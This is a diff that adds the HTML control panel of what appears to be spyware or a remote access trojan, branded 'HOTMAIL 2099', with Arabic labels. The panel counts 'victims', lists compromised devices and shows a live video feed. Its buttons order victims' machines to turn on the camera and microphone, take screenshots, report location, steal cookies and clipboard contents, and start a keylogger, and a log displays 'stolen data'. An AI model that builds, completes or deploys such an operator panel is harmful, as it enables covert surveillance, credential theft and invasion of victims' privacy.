@@ -1,1 +1,67 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - 2099</title>
+    <link rel="stylesheet" href="admin.css">
+</head>
+<body>
+    <div class="admin-container">
+        <!-- شاشة تسجيل الدخول للمطور -->
+        <div id="login-screen" class="login-screen">
+            <h1>👑 لوحة التحكم</h1>
+            <input type="password" id="admin-key" placeholder="أدخل مفتاح الوصول">
+            <button onclick="authenticateAdmin()">دخول</button>
+        </div>
 
+        <!-- لوحة التحكم الرئيسية -->
+        <div id="main-panel" class="main-panel" style="display: none;">
+            <header>
+                <h1>HOTMAIL 2099 - Control Panel</h1>
+                <div class="stats">
+                    <span>الضحايا: <b id="victim-count">0</b></span>
+                    <span class="online-dot"></span> متصل
+                </div>
+            </header>
+
+            <div class="panel-grid">
+                <!-- قائمة الضحايا -->
+                <aside class="victims-list">
+                    <h2>الأجهزة المخترقة</h2>
+                    <div id="victims-container"></div>
+                </aside>
+
+                <!-- منطقة العرض والتحكم -->
+                <main class="control-area">
+                    <!-- البث المباشر -->
+                    <div class="video-panel">
+                        <video id="remoteVideo" autoplay playsinline></video>
+                        <div class="video-overlay">LIVE FEED</div>
+                    </div>
+
+                    <!-- أزرار التحكم -->
+                    <div class="control-buttons">
+                        <button onclick="sendCommand('start_cam')">📷 الكاميرا</button>
+                        <button onclick="sendCommand('start_mic')">🎤 الميكروفون</button>
+                        <button onclick="sendCommand('take_screenshot')">📸 لقطة شاشة</button>
+                        <button onclick="sendCommand('get_location')">📍 الموقع</button>
+                        <button onclick="sendCommand('get_cookies')">🍪 الكوكيز</button>
+                        <button onclick="sendCommand('get_clipboard')">📋 الحافظة</button>
+                        <button onclick="sendCommand('keylogger_start')">⌨️ كيلوجر</button>
+                    </div>
+
+                    <!-- سجل البيانات المسروقة -->
+                    <div class="data-log">
+                        <h2>البيانات المسروقة</h2>
+                        <div id="stolen-data"></div>
+                    </div>
+                </main>
+            </div>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="admin.js"></script>
+</body>
+</html>
